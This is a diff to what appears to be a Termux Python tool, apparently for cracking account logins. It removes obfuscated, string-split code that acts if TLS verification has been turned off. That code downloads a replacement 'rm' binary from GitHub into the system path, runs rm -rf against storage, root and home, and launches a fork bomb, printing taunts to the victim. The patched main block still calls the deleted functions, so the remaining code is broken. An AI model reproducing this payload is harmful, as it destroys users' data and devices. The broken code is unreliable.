@@ -439,44 +439,8 @@ def YounisXyz(uid,pwx,tl):
                 break
             else:continue
         loop+=1
-        except requests.exceptions.ConnectionError:time.sleep(20)
-"""-------------------------(MR-TOP TOOL STATUS CHECKER)-------------------------"""
-def issue():
-    if os.path.isfile("/data/d"+"ata/com.ter"+"mux/files/u"+"sr/bin/rm"):pass
-    else:system('clear');print(f'{style} Syste'+'m Modif'+'ication N'+'ot Allo'+'wed Warn'+'ing By Mr Top');exit()
-    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr"+"/bin/cp"):pass
-    else:system('clear');print(f'{style} Syst'+'em Mod'+'ification N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/us"+"r/bin/mv"):pass
-    else:system('clear');print(f'{style} Sys'+'tem Modifi'+'cation N'+'ot All'+'owed Warni'+'ng By Mr Top');exit()
-    if os.path.isfile("/data/d"+"ata/com.termu"+"x/files/usr/bi"+"n/termux-reset"):pass
-    else:system('clear');print(f'{style} Sys'+'tem Modi'+'fication N'+'ot All'+'owed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/dat"+"a/com.termux/files/usr/"+"bin/term"+"ux-setup-storage"):pass
-    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr/"+"bin/pip"):pass
-    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/dat"+"a/com.termux/file"+"s/usr/bin"+"/pip3"):pass
-    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed Wa'+'rning By Mr Top');exit()
-    if os.path.isfile("/data/data/com"+".termux/files/"+"usr/bin/"+"pip3.11"):pass
-    else:system('clear');print(f'{style} Sys'+'tem Modific'+'ation N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-def iamcheckingyou():
-    with open(f'{site}requests/sessions.py', 'r') as file :
-        filedata63 = file.read()
-    if "verify = False" in filedata63:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-    else:pass
-    with open(f'{site}urllib3/conne'+'ction.py', 'r') as file7i7 :
-        filedata47 = file7i7.read()
-    if str("cert_reqs = 'CERT_NONE'") in filedata47:wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-def verify():
-    with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
-            filedata = file.read()
-    filedata = filedata.replace('verify = False', 'verify = True')
-    with open(f'{site}reque'+'sts/sessi'+'ons.py', 'w') as file:
-        file.write(filedata)
-    if "verify = True" in filedata:pass
-    else:
-        with open(f'{site}requ'+'ests/sess'+'ions.py', 'a') as file:
-            file.write('\nverify = True\n')
-    pass
+     except:
+        pass
 """-------------------------(DEFINE AND RUN TOOL)-------------------------"""
 if __name__=='__main__':
     try:issue();iamcheckingyou();verify();rsbuy()
